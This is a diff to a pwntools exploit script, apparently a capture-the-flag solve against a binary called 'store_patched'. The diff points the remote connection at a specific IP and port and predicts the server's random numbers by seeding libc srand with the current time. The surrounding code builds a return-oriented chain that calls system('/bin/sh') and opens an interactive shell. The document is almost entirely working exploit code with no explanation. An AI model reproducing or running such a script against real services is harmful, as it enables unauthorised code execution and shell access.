@@ -9,7 +9,6 @@ exe = ELF('store_patched', checksec=False)
 libc = ELF('libc.so.6', checksec=False)
 rd = ctypes.CDLL("libc.so.6")
 context.binary = exe
-a = rd.srand(int(time.time()))
 
 info = lambda msg: log.info(msg)
 s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
@@ -36,11 +35,17 @@ def GDB():
         ''')
         sleep(1)
 
-
+#  nc 67.223.119.69 3648 
 if args.REMOTE:
-    p = remote('0', 1337)
+    p = remote('67.223.119.69', 3648)
 else:
     p = process([exe.path])
+# server 
+seed = int(time.time() + 1)
+a = rd.srand(seed)
+# # local
+# seed = int(time.time())
+# a = rd.srand(seed)
 
 cnt = []
 
@@ -197,6 +202,8 @@ load = flat(
 
 
 edit(0, load)
+GDB()
+
 pop_rdi = 0x000000000002a3e5 + libc.address
 load = flat(
     pop_rdi+1,
@@ -204,10 +211,10 @@ load = flat(
     next(libc.search(b'/bin/sh')),
     libc.sym.system
 )
-GDB()
 slna(b'>> ', 5)
 slna(b'>> ', 3)
 sna(b'ndex: ', 0)
+
 sa(b': ', load)
 
 p.interactive()
